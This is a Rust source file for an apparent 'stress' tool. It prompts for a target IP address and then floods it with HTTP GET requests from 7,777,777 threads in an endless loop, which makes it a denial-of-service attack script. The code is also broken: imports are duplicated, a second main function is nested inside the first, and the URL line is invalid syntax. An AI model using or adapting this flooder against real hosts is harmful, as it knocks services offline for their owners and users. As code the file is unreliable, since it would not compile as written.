use std::io;
use std::io::{self, Write};
use std::sync::mpsc::channel;
use std::thread;
use reqwest::Client;

fn main() {
    let mut input = String::new();
    println!("Enter the IP address to stress:");
    io::stdin().read_line(&mut input).expect("Failed to read line");

    fn main() -> Result<(), reqwest::Error> {
        loop {
            let url = ({}, input.trim());
            let n_threads = 7777777;
    
            let (tx, rx) = channel();
            for _ in 0..n_threads {
                let tx = tx.clone();
                let client = Client::new();
    
                thread::spawn(move || {
                    let res = client.get(url).send();
                    match res {
                        Ok(res) => {
                            if res.status().is_success() {
                                tx.send(()).unwrap();
                            } else {
                                eprintln!("Request failed with status: {}", res.status());
                            }
                        }
                        Err(err) => {
                            eprintln!("Request error: {}", err);
                        }
                    }
                });
            }
    
            for _ in 0..n_threads {
                rx.recv().unwrap();
            }
        }
    }
}